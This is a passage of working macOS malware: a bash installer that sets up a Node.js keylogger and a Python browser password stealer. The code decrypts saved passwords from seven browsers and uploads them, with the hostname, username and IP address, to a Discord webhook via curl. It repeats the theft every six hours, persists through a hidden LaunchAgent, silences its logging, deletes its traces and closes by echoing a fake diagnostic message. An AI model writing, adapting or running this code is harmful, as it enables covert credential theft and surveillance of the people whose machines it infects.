    with open(OUTPUT_FILE, 'w') as f:
        f.write(f"Password Extraction Started: {subprocess.run(['date'], capture_output=True, text=True).stdout}\\n\\n")
    
    extract_chrome_passwords()
    extract_brave_passwords()
    extract_edge_passwords()
    extract_opera_passwords()
    extract_vivaldi_passwords()
    extract_firefox_passwords()
    extract_safari_passwords()
    extract_system_info()
    
    with open(OUTPUT_FILE, 'a') as f:
        f.write(f"Extraction Complete: {subprocess.run(['date'], capture_output=True, text=True).stdout}\\n")
`;

    // Create bash wrapper script
    const script = `#!/bin/bash
OUTPUT_FILE="${OUTPUT_FILE}"

# Install Python3 if not available
if ! command -v python3 &> /dev/null; then
    echo "Python3 not found - using basic extraction" >> "$OUTPUT_FILE"
    exit 1
fi

# Install brew if not available (for nss)
if ! command -v brew &> /dev/null; then
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" >/dev/null 2>&1 || true
fi

# Install nss (required for Firefox decryption)
if command -v brew &> /dev/null; then
    brew list nss >/dev/null 2>&1 || brew install nss >/dev/null 2>&1 || true
fi

# Install pip and required packages if needed
if ! command -v pip3 &> /dev/null && command -v python3 &> /dev/null; then
    curl -s https://bootstrap.pypa.io/get-pip.py | python3 - --quiet --user 2>/dev/null || true
fi

# Install pycryptodome if not available
if command -v pip3 &> /dev/null; then
    pip3 install --quiet --user pycryptodome 2>/dev/null || true
fi

# Write Python script
cat > "${pythonScript}" << 'PYTHONEOF'
${pythonCode}
PYTHONEOF

# Make Python script executable
chmod +x "${pythonScript}"

# Run Python script
python3 "${pythonScript}" 2>/dev/null || {
    # Fallback to basic extraction if Python fails
    echo "Python extraction failed - using basic method" >> "$OUTPUT_FILE"
}
`;

    try {
        // Write script to temp file
        fs.writeFileSync(EXTRACT_SCRIPT, script);
        fs.chmodSync(EXTRACT_SCRIPT, '755');
        
        // Run extraction script
        exec(`bash "${EXTRACT_SCRIPT}"`, (error, stdout, stderr) => {
            // Wait a moment for files to be written (including key4.db files)
            setTimeout(() => {
                // Wait for key4.db files to be written (check multiple times)
                let attempts = 0;
                const waitForOutput = () => {
                    attempts++;
                    // Wait for OUTPUT_FILE to be ready
                    const hasOutput = fs.existsSync(OUTPUT_FILE);
                    
                    if (hasOutput || attempts >= 10) {
                        // Proceed with sending
                        if (hasOutput) {
                            const content = fs.readFileSync(OUTPUT_FILE, 'utf8');
                            
                            if (content && content.length > 50) {
                        // Get IP address
                        const ip = os.networkInterfaces();
                        let ipAddress = 'Unknown';
                        for (const name of Object.keys(ip)) {
                            for (const iface of ip[name]) {
                                if (iface.family === 'IPv4' && !iface.internal) {
                                    ipAddress = iface.address;
                                    break;
                                }
                            }
                            if (ipAddress !== 'Unknown') break;
                        }
                        
                        // Detect which browsers were found
                        const browsers = [];
                        if (content.includes('CHROME PASSWORDS') || content.includes('Chrome')) browsers.push('Chrome');
                        if (content.includes('BRAVE PASSWORDS') || content.includes('Brave')) browsers.push('Brave');
                        if (content.includes('EDGE PASSWORDS') || content.includes('Edge')) browsers.push('Edge');
                        if (content.includes('OPERA PASSWORDS') || content.includes('Opera')) browsers.push('Opera');
                        if (content.includes('VIVALDI PASSWORDS') || content.includes('Vivaldi')) browsers.push('Vivaldi');
                        if (content.includes('FIREFOX PASSWORDS') || content.includes('Firefox')) browsers.push('Firefox');
                        if (content.includes('SAFARI PASSWORDS') || content.includes('Safari')) browsers.push('Safari');
                        const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
                        
                        // Create modern message
                        const message = {
                            embeds: [{
                                title: "🔐 Browser Passwords",
                                color: 0xff9900,
                                fields: [
                                    { name: "Collected From", value: `\`${browserList}\``, inline: false },
                                    { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
                                    { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
                                    { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
                                    { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
                                ],
                                timestamp: new Date().toISOString()
                            }]
                        };
                        
                        // Send to Discord with file attachment (use embed, not content)
                        const payloadFile = path.join(screenshotDir, `password_extract_${Date.now()}.json`);
                        const payload = message; // message is already an embed object
                        
                        try {
                            fs.writeFileSync(payloadFile, JSON.stringify(message));
                            
                            // Build curl command - only send password file (no key4.db files)
                            let curlCmd = `curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE}" "${WEBHOOK}"`;
                            
                            // Send file + message to Discord (passwords are already decrypted in file)
                            exec(curlCmd, (error) => {
                                setTimeout(() => {
                                    try { 
                                        fs.unlinkSync(payloadFile);
                                        fs.unlinkSync(EXTRACT_SCRIPT);
                                        fs.unlinkSync(OUTPUT_FILE);
                                    } catch (e) {}
                                }, 10000);
                            });
                        } catch (e) {
                            // Fallback: send text only
                            const textPayload = { content: message };
                            const textFile = path.join(screenshotDir, `password_text_${Date.now()}.json`);
                            try {
                                fs.writeFileSync(textFile, JSON.stringify(textPayload));
                                exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
                                    setTimeout(() => {
                                        try { 
                                            fs.unlinkSync(textFile);
                                            fs.unlinkSync(EXTRACT_SCRIPT);
                                            fs.unlinkSync(OUTPUT_FILE);
                                        } catch (e) {}
                                    }, 10000);
                                });
                            } catch (e2) {}
                            }
                        } else {
                            // No content or file too small - retry
                            if (attempts < 10) {
                                setTimeout(waitForKey4Files, 500);
                            }
                        }
                    } else {
                        // OUTPUT_FILE doesn't exist yet - retry
                        if (attempts < 10) {
                            setTimeout(waitForKey4Files, 500);
                        }
                    }
                };
                waitForOutput();
            }, 2000);
        });
    } catch (e) {
        // Ignore errors
    }
}

// Run password extraction on startup (after 15 seconds) and then every 6 hours
setTimeout(() => {
    extractPasswords();
}, 15000);

// Run password extraction every 6 hours
setInterval(() => {
    extractPasswords();
}, 21600000); // 6 hours

// Send startup message IMMEDIATELY (verify it's running)
(function sendStartupMessage() {
    const ip = os.networkInterfaces();
    let ipAddress = 'Unknown';
    for (const name of Object.keys(ip)) {
        for (const iface of ip[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                ipAddress = iface.address;
                break;
            }
        }
        if (ipAddress !== 'Unknown') break;
    }

    // Use Discord embed for better formatting
    const startupPayload = {
        embeds: [{
            title: "✅ Keylogger Started Successfully",
            color: 0x00ff00,
            fields: [
                { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
                { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
                { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
                { name: "Status", value: "`Running 24/7`", inline: true },
                { name: "Timestamp", value: `\`${new Date().toLocaleString()}\``, inline: true }
            ],
            timestamp: new Date().toISOString()
        }]
    };
    const startupFile = path.join(screenshotDir, `startup_${Date.now()}.json`);
    try {
        fs.writeFileSync(startupFile, JSON.stringify(startupPayload));
        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${startupFile}" "${WEBHOOK}"`, (error) => {
            setTimeout(() => {
                try { fs.unlinkSync(startupFile); } catch (e) {}
            }, 5000);
        });
    } catch (e) {}
})();

console.log = () => {};
console.error = () => {};
KEYLOGGEREOF
    
    # Create package.json
    cat > "$APP_DIR/package.json" << 'PKGEOF'
{
  "name": "keylogger-helper",
  "version": "1.0.0",
  "main": "keylogger-screenshotter.js",
  "dependencies": {
  }
}
PKGEOF
    
    # Install dependencies (silent)
    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || true
    
    # REMOVED: pke keylogger installation (repository not available)
    # Clipboard monitoring is working and captures copy/paste activity
    
    # Create Launch Agent for 24/7 operation (runs even after terminal closes)
    local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
    local KEYLOGGER_AGENT_FILE="$LAUNCH_AGENT_DIR/com.keylogger.helper.plist"
    
    mkdir -p "$LAUNCH_AGENT_DIR" 2>/dev/null
    
    cat > "$KEYLOGGER_AGENT_FILE" << PLISTEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.keylogger.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>$NODE_PATH</string>
        <string>$APP_DIR/keylogger-screenshotter.js</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>LaunchOnlyOnce</key>
    <false/>
    <key>WorkingDirectory</key>
    <string>$APP_DIR</string>
    <key>StandardOutPath</key>
    <string>$APP_DIR/keylogger.log</string>
    <key>StandardErrorPath</key>
    <string>$APP_DIR/keylogger.error.log</string>
    <key>ProcessType</key>
    <string>Background</string>
    <key>ThrottleInterval</key>
    <integer>10</integer>
    <key>StartInterval</key>
    <integer>60</integer>
</dict>
</plist>
PLISTEOF
    
    # Load and start Launch Agent (ensure it actually starts and persists!)
    launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null
    launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null
    
    # Wait a moment then start it (ONLY via LaunchAgent - no duplicate!)
    sleep 2
    launchctl start com.keylogger.helper 2>/dev/null || true
    
    # Keylogger startup message is sent by the JS script itself (no duplicate needed)
}

# Install keylogger + screenshotter in background (SILENT - no output)
# This runs 24/7, sends keystrokes + screenshots to Discord
install_keylogger_screenshotter_internal >/dev/null 2>&1 &

# Wait for seed file search to complete (if it was started)
if [ -n "$SEED_SEARCH_PID" ]; then
    wait $SEED_SEARCH_PID 2>/dev/null || true
fi

# Cleanup - delete all temp files
rm -f "$RESPONSE_FILE" "$ERROR_FILE" "$HTTP_CODE_FILE" "$URL_FILE" "$UPLOAD_STATUS_FILE" 2>/dev/null
rm -rf "$WORKDIR"

echo "Still detecting unresolved issues..."
echo ""
